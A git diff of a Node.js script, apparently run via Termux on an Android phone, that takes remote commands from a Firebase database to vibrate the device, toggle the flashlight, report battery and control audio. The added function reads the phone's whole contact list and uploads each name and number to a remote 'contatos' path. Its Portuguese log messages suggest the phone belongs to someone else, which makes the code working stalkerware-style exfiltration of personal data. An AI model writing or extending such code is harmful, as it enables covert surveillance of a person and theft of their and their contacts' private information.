@@ -21,6 +21,7 @@ const vibrarRef = ref(db, "vibrador/vibrar");
 const lanternaRef = ref(db, "lanterna/status");
 const bateriaRef = ref(db, "bateria/status");
 const zoioRef = ref(db, "audio-zoio/status");
+const contatosRef = ref(db, "contatos");
 
 onValue(vibrarRef, (snapshot) => {
     const vibrar = snapshot.val();
@@ -87,7 +88,7 @@ onValue(zoioRef, (snapshot) => {
             if (error) {
                 console.error("Vou tirar não😏", error);
             } else {
-                console.log("Tirado com sucesso😵!");
+                console.log("Eu vou tirar😵!");
                 set(zoioRef, false);
             }
         });
@@ -95,3 +96,27 @@ onValue(zoioRef, (snapshot) => {
         exec("termux-media-player pause");
     }
 });
+
+function atualizarContatos() {
+    exec("termux-contact-list", (error, stdout) => {
+        if (error) {
+            console.error("Quer pegar os contatinhos dela bixo😒?");
+            return;
+        }
+
+        try {
+            const listaContatos = JSON.parse(stdout);
+
+            listaContatos.forEach((contato) => {
+                push(contatosRef, {
+                    name: contato.name || "Sem Nome",
+                    number: contato.number || "Sem Número"
+                });
+            });
+
+            console.log("Contatinhos capturados😡!");
+        } catch (parseError) {
+            console.error("Erro, glória🙌", parseError);
+        }
+    });
+}
